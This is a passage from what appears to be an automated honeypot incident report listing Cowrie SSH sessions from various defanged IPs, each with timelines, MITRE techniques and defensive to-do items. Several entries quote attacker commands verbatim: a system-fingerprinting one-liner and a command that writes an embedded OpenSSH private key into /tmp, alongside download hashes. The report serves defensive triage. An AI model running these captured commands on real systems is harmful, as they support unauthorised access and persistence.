| `2026-08-16 17:21:19` | `cowrie.log.closed` |
| `2026-08-16 17:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1755e58bf248

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]243` |
| **First Seen** | 2026-08-16 17:22 |
| **Last Seen** | 2026-08-16 17:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:22:20` | `cowrie.session.connect` |
| `2026-08-16 17:22:20` | `cowrie.client.version` |
| `2026-08-16 17:22:21` | `cowrie.client.kex` |
| `2026-08-16 17:22:23` | `cowrie.login.success` |
| `2026-08-16 17:22:23` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:22:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:22:23` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]243` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-491158bfa14d

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:22 |
| **Last Seen** | 2026-08-16 17:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:22:58` | `cowrie.session.connect` |
| `2026-08-16 17:22:58` | `cowrie.client.version` |
| `2026-08-16 17:22:59` | `cowrie.client.kex` |
| `2026-08-16 17:23:00` | `cowrie.login.success` |
| `2026-08-16 17:23:01` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:23:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:23:01` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661b6e8d6575

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:23 |
| **Last Seen** | 2026-08-16 17:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:23:08` | `cowrie.session.connect` |
| `2026-08-16 17:23:09` | `cowrie.client.version` |
| `2026-08-16 17:23:09` | `cowrie.client.kex` |
| `2026-08-16 17:23:10` | `cowrie.login.success` |
| `2026-08-16 17:23:12` | `cowrie.session.params` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.success` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.command.input` |
| `2026-08-16 17:23:12` | `cowrie.log.closed` |
| `2026-08-16 17:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd8af59fd55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:25 |
| **Last Seen** | 2026-08-16 17:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:25:03` | `cowrie.session.connect` |
| `2026-08-16 17:25:04` | `cowrie.client.version` |
| `2026-08-16 17:25:04` | `cowrie.client.kex` |
| `2026-08-16 17:25:05` | `cowrie.login.success` |
| `2026-08-16 17:25:06` | `cowrie.session.params` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.success` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:06` | `cowrie.command.input` |
| `2026-08-16 17:25:07` | `cowrie.log.closed` |
| `2026-08-16 17:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1dbf62d8cb2

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-08-16 17:25 |
| **Last Seen** | 2026-08-16 17:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:25:05` | `cowrie.session.connect` |
| `2026-08-16 17:25:07` | `cowrie.client.version` |
| `2026-08-16 17:25:07` | `cowrie.client.kex` |
| `2026-08-16 17:25:10` | `cowrie.login.success` |
| `2026-08-16 17:25:11` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f345f4df3c7

| Field | Detail |
|---|---|
| **Source IP** | `117.253.130[.]123` |
| **First Seen** | 2026-08-16 17:25 |
| **Last Seen** | 2026-08-16 17:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:25:17` | `cowrie.session.connect` |
| `2026-08-16 17:25:18` | `cowrie.client.version` |
| `2026-08-16 17:25:18` | `cowrie.client.kex` |
| `2026-08-16 17:25:20` | `cowrie.login.success` |
| `2026-08-16 17:25:20` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.253.130[.]123` to AbuseIPDB if not already reported
- [ ] Block `117.253.130[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c21c5c88ba

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 17:26 |
| **Last Seen** | 2026-08-16 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:26:41` | `cowrie.session.connect` |
| `2026-08-16 17:26:41` | `cowrie.client.version` |
| `2026-08-16 17:26:41` | `cowrie.client.kex` |
| `2026-08-16 17:26:41` | `cowrie.login.success` |
| `2026-08-16 17:26:41` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:26:41` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb14a786592e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:27 |
| **Last Seen** | 2026-08-16 17:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:27:04` | `cowrie.session.connect` |
| `2026-08-16 17:27:04` | `cowrie.client.version` |
| `2026-08-16 17:27:04` | `cowrie.client.kex` |
| `2026-08-16 17:27:05` | `cowrie.login.success` |
| `2026-08-16 17:27:06` | `cowrie.session.params` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.success` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.command.input` |
| `2026-08-16 17:27:06` | `cowrie.log.closed` |
| `2026-08-16 17:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8095c23a8505

| Field | Detail |
|---|---|
| **Source IP** | `8.208.44[.]152` |
| **First Seen** | 2026-08-16 17:27 |
| **Last Seen** | 2026-08-16 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:27:16` | `cowrie.session.connect` |
| `2026-08-16 17:27:16` | `cowrie.client.version` |
| `2026-08-16 17:27:17` | `cowrie.client.kex` |
| `2026-08-16 17:27:17` | `cowrie.login.success` |
| `2026-08-16 17:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.208.44[.]152` to AbuseIPDB if not already reported
- [ ] Block `8.208.44[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aea12520068

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-16 17:27 |
| **Last Seen** | 2026-08-16 17:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:27:17` | `cowrie.session.connect` |
| `2026-08-16 17:27:17` | `cowrie.client.version` |
| `2026-08-16 17:27:17` | `cowrie.client.kex` |
| `2026-08-16 17:27:18` | `cowrie.login.success` |
| `2026-08-16 17:27:19` | `cowrie.session.params` |
| `2026-08-16 17:27:19` | `cowrie.command.input` |
| `2026-08-16 17:27:20` | `cowrie.session.file_download` |
| `2026-08-16 17:27:20` | `cowrie.session.file_download` |
| `2026-08-16 17:27:20` | `cowrie.log.closed` |
| `2026-08-16 17:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf91bea27686

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:29 |
| **Last Seen** | 2026-08-16 17:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:29:09` | `cowrie.session.connect` |
| `2026-08-16 17:29:09` | `cowrie.client.version` |
| `2026-08-16 17:29:09` | `cowrie.client.kex` |
| `2026-08-16 17:29:10` | `cowrie.login.success` |
| `2026-08-16 17:29:11` | `cowrie.session.params` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.success` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.command.input` |
| `2026-08-16 17:29:11` | `cowrie.log.closed` |
| `2026-08-16 17:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5656e254f734

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]243` |
| **First Seen** | 2026-08-16 17:29 |
| **Last Seen** | 2026-08-16 17:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:29:22` | `cowrie.session.connect` |
| `2026-08-16 17:29:22` | `cowrie.client.version` |
| `2026-08-16 17:29:23` | `cowrie.client.kex` |
| `2026-08-16 17:29:24` | `cowrie.login.success` |
| `2026-08-16 17:29:24` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:29:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:29:25` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]243` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ca27ad491f9

| Field | Detail |
|---|---|
| **Source IP** | `194.31.8[.]12` |
| **First Seen** | 2026-08-16 17:29 |
| **Last Seen** | 2026-08-16 17:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:29:35` | `cowrie.session.connect` |
| `2026-08-16 17:29:35` | `cowrie.client.version` |
| `2026-08-16 17:29:35` | `cowrie.client.kex` |
| `2026-08-16 17:29:37` | `cowrie.login.success` |
| `2026-08-16 17:29:37` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.31.8[.]12` to AbuseIPDB if not already reported
- [ ] Block `194.31.8[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff5c1c1f9ddd

| Field | Detail |
|---|---|
| **Source IP** | `175.206.113[.]91` |
| **First Seen** | 2026-08-16 17:29 |
| **Last Seen** | 2026-08-16 17:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:29:43` | `cowrie.session.connect` |
| `2026-08-16 17:29:44` | `cowrie.client.version` |
| `2026-08-16 17:29:44` | `cowrie.client.kex` |
| `2026-08-16 17:29:47` | `cowrie.login.success` |
| `2026-08-16 17:29:49` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `175.206.113[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626e58f89241

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-16 17:30 |
| **Last Seen** | 2026-08-16 17:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:30:08` | `cowrie.session.connect` |
| `2026-08-16 17:30:09` | `cowrie.client.version` |
| `2026-08-16 17:30:09` | `cowrie.client.kex` |
| `2026-08-16 17:30:11` | `cowrie.login.success` |
| `2026-08-16 17:30:12` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83fb25d4616b

| Field | Detail |
|---|---|
| **Source IP** | `116.113.241[.]82` |
| **First Seen** | 2026-08-16 17:30 |
| **Last Seen** | 2026-08-16 17:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:30:13` | `cowrie.session.connect` |
| `2026-08-16 17:30:13` | `cowrie.client.version` |
| `2026-08-16 17:30:13` | `cowrie.client.kex` |
| `2026-08-16 17:30:16` | `cowrie.login.success` |
| `2026-08-16 17:30:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.241[.]82` to AbuseIPDB if not already reported
- [ ] Block `116.113.241[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93147a2a225

| Field | Detail |
|---|---|
| **Source IP** | `196.191.142[.]67` |
| **First Seen** | 2026-08-16 17:30 |
| **Last Seen** | 2026-08-16 17:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:30:17` | `cowrie.session.connect` |
| `2026-08-16 17:30:18` | `cowrie.client.version` |
| `2026-08-16 17:30:18` | `cowrie.client.kex` |
| `2026-08-16 17:30:20` | `cowrie.login.success` |
| `2026-08-16 17:30:20` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:30:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.142[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.191.142[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f8de8a811a

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-16 17:30 |
| **Last Seen** | 2026-08-16 17:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:30:21` | `cowrie.session.connect` |
| `2026-08-16 17:30:22` | `cowrie.client.version` |
| `2026-08-16 17:30:22` | `cowrie.client.kex` |
| `2026-08-16 17:30:25` | `cowrie.login.success` |
| `2026-08-16 17:30:26` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62c429ff491e

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-08-16 17:30 |
| **Last Seen** | 2026-08-16 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:30:33` | `cowrie.session.connect` |
| `2026-08-16 17:30:33` | `cowrie.client.version` |
| `2026-08-16 17:30:33` | `cowrie.client.kex` |
| `2026-08-16 17:30:35` | `cowrie.login.success` |
| `2026-08-16 17:30:36` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe684a8b7b74

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:31 |
| **Last Seen** | 2026-08-16 17:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
